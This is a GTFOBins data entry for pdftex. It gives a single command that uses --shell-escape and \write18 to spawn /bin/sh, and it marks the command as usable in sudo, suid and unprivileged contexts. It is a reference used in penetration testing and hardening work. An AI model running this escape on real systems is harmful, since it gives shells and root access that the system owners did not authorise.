<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/pdftex -->
---
functions:
  shell:
  - code: |-
      pdftex --shell-escape '\write18{/bin/sh}\end'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
